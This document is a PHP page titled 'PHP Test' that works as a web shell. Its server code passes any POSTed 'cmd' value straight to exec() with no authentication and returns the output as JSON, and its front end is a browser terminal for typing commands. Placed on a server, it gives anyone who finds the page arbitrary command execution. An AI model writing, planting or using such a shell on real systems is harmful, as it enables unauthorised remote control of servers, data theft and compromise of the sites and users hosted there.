<?php

    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
            $lines = array();
            $output = exec($_POST['cmd'], $lines);
            //$lines = preg_split("/\r\n|\n|\r/", $output);

            header('Content-Type: application.json');
            echo json_encode(array("cmd_output" => $lines, "cmd" => $_POST["cmd"]));

            exit();
    }

?>

<html>
    <head>
        <title>PHP Test</title>

        <style>
            #terminal-out {
                background: #000000;
                width: 100%;
                overflow-y: auto;
                height: 90%;

            }

            #terminal-out > p {
                color: #6AFF00;
                margin: 3px;
            }

            #terminal {

                width: 100%;
            }

            #cmd {
                border-left:0;
                border-right:0;
                border-bottom:0;
                border-top: 1;
                border-color: #6AFF00;
                background: #2B2B2B;
                color: #6AFF00;
                width: 100%
            }


            #submit_button {
                display: none;
            }

           

       

        </style>
        <script>
        var update_terminal = function(output) {


            var term = document.getElementById("terminal-out");
            

            //Check which property to use to edit text node.
            //Firefox doesn't support innerText, IE doesn't support
            //textContent.
            //Could just use innerHTML but it's not safe with respect to tag injection
            var new_paragraph = document.createElement("p");
            var textProperty = ('innerText' in new_paragraph) ? 'innerText' : 'textContent';

            new_paragraph[textProperty] = ">>> " + output.cmd;
            term.appendChild(new_paragraph);
            new_paragraph.scrollIntoView(false);

            for(var i = 0; i < output.cmd_output.length; i++)
            {
                new_paragraph = document.createElement("p");
                new_paragraph[textProperty] = output.cmd_output[i];
                term.appendChild(new_paragraph);
                new_paragraph.scrollIntoView(false);
            }

            term.appendChild(document.createElement("br"));

        };

        var send_command = function(e) {
            e.preventDefault();
            var cmd = document.getElementById("cmd").value;

            var req = new XMLHttpRequest();

            req.onreadystatechange = function() {
                if(req.readyState === 4) {
                    update_terminal(JSON.parse(req.responseText));
                }
            };

            req.open("POST", document.URL, true);
            req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            req.send("cmd="+ encodeURIComponent(cmd));

        };

        </script>
    </head>

    <body>
        <code>
            <div id="terminal-out">
           </div>
        </code>

        <form id="terminal" onsubmit="send_command(event);">
            <input type="text" id="cmd">
            <input type="submit" id="submit_button">
        </form>

    </body>
</html>